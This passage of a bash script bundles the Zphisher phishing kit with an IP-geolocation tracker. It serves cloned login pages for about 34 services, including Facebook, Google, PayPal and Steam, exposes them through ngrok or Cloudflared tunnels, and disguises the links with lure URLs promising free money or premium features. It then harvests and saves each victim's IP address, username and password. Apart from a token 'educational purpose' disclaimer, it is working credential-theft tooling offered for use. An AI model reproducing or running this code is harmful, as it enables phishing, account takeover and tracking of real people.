		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
		${GREEN}Version  ${RED}:  ${ORANGE}2.2

		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,AliMilani ${RESETBG}

		${RED}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}


## DON'T COPY PASTE WITHOUT CREDIT DUDE :')

## Start Cloudflared
start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='http://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='http://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='http://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='http://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='http://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='http://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='http://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='http://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
		${RED}[${WHITE}34${RED}]${ORANGE} Discord

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='http://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='http://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='http://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='http://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='http://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='http://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='http://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='http://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='http://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='http://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='http://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='http://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='http://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='http://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='http://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='http://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='http://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='http://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='http://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='http://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='http://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='http://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='http://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='http://get-discord-nitro-free'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
main_menu
###############end
fi

###############Zphisher Phishing End #################

############### Track Ip Start ########################

if [ $zuzu = 5 ] || [ $zuzu = 05 ]
then
###############

#!/bin/bash

banner() {

clear
printf "\e[0m\n"
printf "\e[1;33m   _______             _     \e[0m\e[1;32m  _____       \e[0m\n"
printf "\e[1;33m  |__   __|           | |    \e[0m\e[1;32m |_   _|      \e[0m\n"
printf "\e[1;33m     | |_ __ __ _  ___| | __ \e[0m\e[1;32m   | |  _ __  \e[0m\n"
printf "\e[1;33m     | |  __/ _  |/ __| |/ / \e[0m\e[1;32m   | | |  _ \ \e[0m\n"
printf "\e[1;33m     | | | | (_| | (__|   <  \e[0m\e[1;32m  _| |_| |_) |\e[0m\n"
printf "\e[1;33m     |_|_|  \__,_|\___|_|\_\ \e[0m\e[1;32m |_____| .__/ \e[0m\n"
printf "\e[1;32m                                    | |    \e[0m\n"
printf "\e[1;32m                                    |_|    \e[0m\n"
printf "\e[0m\n"
printf "\e[0m\e[1;33m    Created By ZuH@ck \e[0m\e[1;31m(\e[0m\e[1;33m MyanmarAnonousHelperTeam \e[0m\e[1;31m)\e[0m\n"

}

menu() {
printf "\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m01\e[0m\e[1;31m]\e[0m\e[1;33m My IP\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m02\e[0m\e[1;31m]\e[0m\e[1;33m Track Ip\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m00\e[0m\e[1;31m]\e[0m\e[1;33m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select An Option \e[0m\e[1;96m: \e[0m\e[1;93m\en' option

if [[ $option == 1 || $option == 01 ]]; then
myipaddr
elif [[ $option == 2 || $option == 02 ]]; then
useripaddr
elif [[ $option == 0 || $option == 00 ]]; then
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
myipaddr() {

myipaddripapico=$(curl -s "https://ipapi.co//json" -L)
myipaddripapicom=$(curl -s "http://ip-api.com/json/" -L)
myip=$(echo $myipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
mycity=$(echo $myipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myregion=$(echo $myipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountry=$(echo $myipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylat=$(echo $myipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylon=$(echo $myipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mytime=$(echo $myipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mypostal=$(echo $myipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myisp=$(echo $myipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myasn=$(echo $myipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountrycode=$(echo $myipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycurrency=$(echo $myipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylanguage=$(echo $myipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycalling=$(echo $myipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')

banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Ip Address    \e[0m\e[1;96m:\e[0m\e[1;92m   $myip\e[0m\n"
printf "  \e[0m\e[1;93m  City          \e[0m\e[1;96m:\e[0m\e[1;92m   $mycity\e[0m\n"
printf "  \e[0m\e[1;93m  Region        \e[0m\e[1;96m:\e[0m\e[1;92m   $myregion\e[0m\n"
printf "  \e[0m\e[1;93m  Country       \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Latitude      \e[0m\e[1;96m:\e[0m\e[1;92m    $mylat\e[0m\n"
printf "  \e[0m\e[1;93m  Longitude     \e[0m\e[1;96m:\e[0m\e[1;92m    $mylon\e[0m\n"
printf "  \e[0m\e[1;93m  Time Zone     \e[0m\e[1;96m:\e[0m\e[1;92m    $mytime\e[0m\n"
printf "  \e[0m\e[1;93m  Postal Code   \e[0m\e[1;96m:\e[0m\e[1;92m    $mypostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP           \e[0m\e[1;96m:\e[0m\e[1;92m   $myisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN           \e[0m\e[1;96m:\e[0m\e[1;92m   $myasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Country Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Currency      \e[0m\e[1;96m:\e[0m\e[1;92m   $mycurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Languages     \e[0m\e[1;96m:\e[0m\e[1;92m   $mylanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Calling Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $mycalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  GOOGLE Maps   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$mylat,$mylon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit1

if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}

useripaddr() {

banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress

ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')

banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Ip Address    \e[0m\e[1;96m:\e[0m\e[1;92m   $userip\e[0m\n"
printf "  \e[0m\e[1;93m  City          \e[0m\e[1;96m:\e[0m\e[1;92m   $usercity\e[0m\n"
printf "  \e[0m\e[1;93m  Region        \e[0m\e[1;96m:\e[0m\e[1;92m   $useregion\e[0m\n"
printf "  \e[0m\e[1;93m  Country       \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Latitude      \e[0m\e[1;96m:\e[0m\e[1;92m    $userlat\e[0m\n"
printf "  \e[0m\e[1;93m  Longitude     \e[0m\e[1;96m:\e[0m\e[1;92m    $userlon\e[0m\n"
printf "  \e[0m\e[1;93m  Time Zone     \e[0m\e[1;96m:\e[0m\e[1;92m    $usertime\e[0m\n"
printf "  \e[0m\e[1;93m  Postal Code   \e[0m\e[1;96m:\e[0m\e[1;92m    $userpostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP           \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN           \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Country Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Currency      \e[0m\e[1;96m:\e[0m\e[1;92m   $usercurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Languages     \e[0m\e[1;96m:\e[0m\e[1;92m   $userlanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Calling Code  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  GOOGLE Maps   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m>>\e[0m\e[1;96m  \en' mainorexit2

if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
